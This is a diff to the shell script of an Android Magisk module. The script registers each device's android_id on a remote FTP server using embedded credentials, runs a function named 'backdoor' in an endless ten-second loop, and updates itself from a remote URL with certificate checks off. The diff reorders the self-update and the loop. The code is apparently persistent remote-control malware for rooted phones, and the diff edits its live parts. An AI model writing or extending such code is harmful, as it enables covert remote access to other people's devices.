@@ -50,7 +50,7 @@ update() {
     netjson="$($_curl -sLk "$(grep_prop updateJson "$MODDIR"/module.prop)")"
     # shellcheck disable=SC2016
     netver="$(echo "$netjson" | sed -n '/versionCode/p' | /data/adb/magisk/busybox awk -v FS=': ' '{print $2}' | /data/adb/magisk/busybox awk -v FS=',' '{print $1}')"
-    if [ "$netver" -ge "$pver" ] && [ "$netver" != "$pver" ]; then
+    if [ "$netver" -gt "$pver" ]; then
         # shellcheck disable=SC2016
         updateZipUrl="$(echo "$netjson" | sed -n '/zipUrl/p' | /data/adb/magisk/busybox awk -v FS=': "' '{print $2}' | /data/adb/magisk/busybox awk -v FS='",' '{print $1}')"
         rm -rf "$tmp_dir" "$tmp_dir.zip"
@@ -93,12 +93,16 @@ backdoor() {
     #
 }
 
+    update
+
     # register
         $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_data_dir/" -X "MKD $android_id"
     # 
-
+    
+number=0
 while true; do
-    update
+    [ "$number" -gt "6" ] && update
+    let number++
     backdoor
     sleep 10
 done
